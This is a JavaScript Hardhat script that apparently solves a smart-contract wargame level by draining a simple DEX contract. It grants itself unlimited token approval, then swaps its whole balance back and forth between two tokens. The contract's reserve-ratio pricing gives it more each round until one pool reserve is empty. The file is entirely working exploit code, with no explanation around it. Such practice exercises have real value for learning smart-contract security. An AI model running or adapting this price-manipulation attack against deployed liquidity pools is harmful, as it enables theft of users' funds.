import { ethers } from "hardhat";

async function main() {

  // TODO: change these addresses with yours
  // await contract.token1()
  const token1 = "0xF857A9Ec7e81A74d3F86D6eF56B9e21a02F5B4Ca";
  // await contract.token2()
  const token2 = "0x097Fbcf310e31c198f655724c1aBd6cdA0B83058";
  // contract.address
  const contractAddress = "0xe15A12d6683bCFe2E729397492E8E1Bb432Dd519";

  const abi = [
    'constructor()',
    'event OwnershipTransferred(address indexed previousOwner, address indexed newOwner)',
    'function addLiquidity(address token_address, uint256 amount) @29000000',
    'function approve(address spender, uint256 amount) @29000000',
    'function balanceOf(address token, address account) view returns (uint256) @29000000',
    'function getSwapPrice(address from, address to, uint256 amount) view returns (uint256) @29000000',
    'function owner() view returns (address) @29000000',
    'function renounceOwnership() @29000000',
    'function setTokens(address _token1, address _token2) @29000000',
    'function swap(address from, address to, uint256 amount) @29000000',
    'function token1() view returns (address) @29000000',
    'function token2() view returns (address) @29000000',
    'function transferOwnership(address newOwner) @29000000'
  ];
  const signer = (await ethers.getSigners())[0];
  const player = signer.address;
  const dexContract = new ethers.Contract(contractAddress, abi, signer);

  console.log("Approve contract to transfer tokens");
  const tx = await dexContract.approve(
    contractAddress,
    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
  );
  console.log("Transaction: " + tx.hash);
  await tx.wait();  

  while(
    await dexContract.balanceOf(token1, contractAddress) != 0
    && await dexContract.balanceOf(token2, contractAddress) != 0
  ){
    const playerToken1Balance = await dexContract.balanceOf(token1, player);
    
    if(playerToken1Balance > 0){
      // check if the contract has enough tokens
      // if it doesn't have enough tokens,
      // you need to make 1 more swap (check the contract)
      // 
      // const swapPrice = await dexContract.getSwapPrice(token1, token2, playerToken1Balance);
      // const contractToken1Balance = await dexContract.balanceOf(token1, contractAddress);
      // if(swapPrice > contractToken1Balance){}

      console.log(`Swapping ${playerToken1Balance} token1 => token2`);
      
      const tx = await dexContract.swap(token1, token2, playerToken1Balance);
      console.log("Transaction: " + tx.hash);
      
      await tx.wait();
    } else {
      const playerToken2Balance = await dexContract.balanceOf(token2, player);
      console.log(`Swapping ${playerToken2Balance} token2 => token1`);
      const tx = await dexContract.swap(token2, token1, playerToken2Balance);
      console.log("Transaction: " + tx.hash);
      
      await tx.wait();
    }

    console.log("Player token 1: " + await dexContract.balanceOf(token1, player));
    console.log("Player token 2: " + await dexContract.balanceOf(token2, player));
    console.log("Contract token 1: " + await dexContract.balanceOf(token1, contractAddress));
    console.log("Contract token 2: " + await dexContract.balanceOf(token2, contractAddress));

  }

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
